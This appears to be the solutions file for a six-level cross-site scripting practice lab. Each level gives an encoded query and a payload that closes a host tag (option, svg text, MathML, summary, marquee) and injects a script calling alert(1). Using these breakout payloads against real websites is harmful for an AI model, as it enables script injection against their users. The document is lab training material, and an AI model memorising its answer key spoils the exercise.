# fragment — solutions

Reflection inside various host tags (`option`, `pre`, `svg`, `math`, `details`, `marquee`) — close the host and inject.

### fragment-level1

`/fragment/level1/?query=%22%3E%3C/option%3E%3C/select%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"></option></select><script>alert(1)</script>`
- context: `<option value="...">` inside `<select>` — close both, then inject

### fragment-level2

`/fragment/level2/?query=%3C%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<><script>alert(1)</script>`
- context: only the first `<` and `>` are entity-encoded (`.sub` not `.gsub`); dummy `<>` consumes them

### fragment-level3

`/fragment/level3/?query=%3C/text%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</text><script>alert(1)</script>`
- context: text node inside `<svg><text>`; close text and inject HTML

### fragment-level4

`/fragment/level4/?query=%3C/mi%3E%3C/math%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</mi></math><script>alert(1)</script>`
- context: text inside `<math><mi>`; close to escape MathML parsing

### fragment-level5

`/fragment/level5/?query=%3C/summary%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</summary><script>alert(1)</script>`
- context: `<summary>` inside `<details>`; close summary then inject

### fragment-level6

`/fragment/level6/?query=%3C/marquee%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</marquee><script>alert(1)</script>`
- context: text inside `<marquee>`; close marquee then inject
